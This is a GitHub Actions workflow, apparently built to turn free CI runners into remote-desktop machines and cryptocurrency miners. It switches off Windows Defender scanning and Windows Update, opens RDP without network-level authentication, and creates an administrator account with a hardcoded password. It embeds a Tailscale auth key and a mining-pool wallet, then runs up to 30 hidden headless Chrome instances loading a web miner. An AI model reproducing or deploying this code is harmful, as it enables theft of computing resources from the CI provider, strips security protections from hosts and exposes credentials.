name: RDP Auto-Recreate with Miner Pro

on:
  workflow_dispatch:
    inputs:
      miner_workers:
        description: 'Number of miner workers'
        required: false
        default: '20'
        type: choice
        options:
          - '10'
          - '15'
          - '20'
          - '25'
          - '30'
  schedule:
    - cron: "0 */6 * * *"

env:
  RDP_USER: "RDPUser"
  RDP_PASSWORD: "DefaultPass!234"
  MAX_RUNTIME: 340
  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x"

jobs:
  rdp-miner-pro:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Environment Variables
        shell: pwsh
        run: |
          $workers = '${{ github.event.inputs.miner_workers }}'
          if (-not $workers) { $workers = '20' }
          Add-Content -Path $env:GITHUB_ENV -Value "MINER_WORKERS=$workers"
          Add-Content -Path $env:GITHUB_ENV -Value "BUILD_ID=$env:GITHUB_RUN_ID"

      - name: System Optimization
        shell: pwsh
        run: |
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableScriptScanning $true
          Set-MpPreference -DisableArchiveScanning $true

          powercfg /change standby-timeout-ac 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change monitor-timeout-ac 0
          powercfg /setactive SCHEME_MIN

          Stop-Service -Name "wuauserv" -Force
          Set-Service -Name "wuauserv" -StartupType Disabled

          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "MaxInstanceCount" -Value 10
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxMonitors" -Value 4
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxXResolution" -Value 3840
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxYResolution" -Value 2160

      - name: Enable and Configure RDP
        shell: pwsh
        run: |
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0

      - name: Create Secure RDP User
        shell: pwsh
        run: |
          $securePassword = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
          if (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue) {
              Remove-LocalUser -Name $env:RDP_USER
          }
          New-LocalUser -Name $env:RDP_USER -Password $securePassword -AccountNeverExpires -PasswordNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
          Enable-LocalUser -Name $env:RDP_USER

      - name: Install Required Software
        shell: pwsh
        run: |
          $chromeInstaller = "$env:TEMP\chrome_installer.exe"
          Invoke-WebRequest "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chromeInstaller
          Start-Process -FilePath $chromeInstaller -ArgumentList "/silent", "/install" -Wait
          Remove-Item $chromeInstaller

          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $installer = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest $tsUrl -OutFile $installer
          Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
          Remove-Item $installer
          Start-Sleep -Seconds 5

      - name: Setup Tailscale VPN
        shell: pwsh
        run: |
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          $hostname = "GH-RDP-$env:GITHUB_RUN_ID"
          for ($i = 1; $i -le 10; $i++) {
            try { & $tsExe status; break } catch { Start-Sleep -Seconds 5 }
          }

          # embedded authkey (as requested)
          & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname $hostname --reset

          for ($i = 1; $i -le 10; $i++) {
            $ip = & $tsExe ip -4 2>$null
            if ($ip -and $ip -ne "0.0.0.0") {
              Add-Content -Path $env:GITHUB_ENV -Value "TS_IP=$ip"
              Write-Host "âœ… Tailscale IP: $ip"
              break
            }
            Start-Sleep -Seconds 10
          }

          if (-not $env:TS_IP) { throw "Tailscale IP retrieval failed" }

      - name: Deploy Advanced Miner System
        shell: pwsh
        run: |
          # Build the miner manager script as an array of literal lines to avoid here-string/YAML issues
          $path = "$env:TEMP\miner_manager.ps1"
          $lines = @(
            '$workers = $env:MINER_WORKERS'
            '$minerUrl = "$env:MINER_URL&workers=$workers"'
            ''
            'for ($i = 1; $i -le $workers; $i++) {'
            '  Start-Job -ScriptBlock {'
            '    param($i, $minerUrl)'
            '    while ($true) {'
            '      try {'
            '        Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--headless","--disable-gpu","--no-sandbox","--remote-debugging-port=9$i","--app=$minerUrl" -WindowStyle Hidden -PassThru'
            '        Start-Sleep -Seconds 600'
            '      } catch {'
            '        Start-Sleep -Seconds 30'
            '      }'
            '    }'
            '  } -ArgumentList $i, $minerUrl -Name "miner-worker-$i"'
            '}'
            ''
            'Write-Host "Started $workers miner workers"'
            'while ($true) { Start-Sleep -Seconds 60 }'
          )
          # Join and write to file
          $lines -join "`n" | Out-File -FilePath $path -Encoding UTF8 -Force

          # Start the miner manager script in background
          Start-Job -ScriptBlock { param($p) powershell -File $p } -ArgumentList $path

      - name: Create Connection Info File
        shell: pwsh
        run: |
          $connectionInfo = @"
RDP CONNECTION INFO
IP: $env:TS_IP
User: $env:RDP_USER
Pass: $env:RDP_PASSWORD
Workers: $env:MINER_WORKERS
Runtime: $env:MAX_RUNTIME minutes
"@
          $connectionInfo | Out-File -FilePath "$env:GITHUB_WORKSPACE\RDP_Info.txt" -Encoding UTF8

      - name: Monitor Session
        shell: pwsh
        run: |
          $startTime = Get-Date
          $endTime = $startTime.AddMinutes([int]$env:MAX_RUNTIME)
          while ((Get-Date) -lt $endTime) {
              $elapsed = [int]((Get-Date) - $startTime).TotalMinutes
              $remaining = [int]($endTime - (Get-Date)).TotalMinutes
              Write-Host "Elapsed: $elapsed minutes - Remaining: $remaining minutes - Workers: $env:MINER_WORKERS"
              Start-Sleep -Seconds 60
          }

      - name: Cleanup Resources
        if: always()
        shell: pwsh
        run: |
          Write-Host "Cleaning up..."
          Get-Job | Stop-Job -Force
          Get-Job | Remove-Job -Force
          Stop-Process -Name "chrome*" -ErrorAction SilentlyContinue -Force
          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
          Remove-Item "$env:TEMP\miner_manager.ps1" -ErrorAction SilentlyContinue
          Write-Host "Cleanup completed"
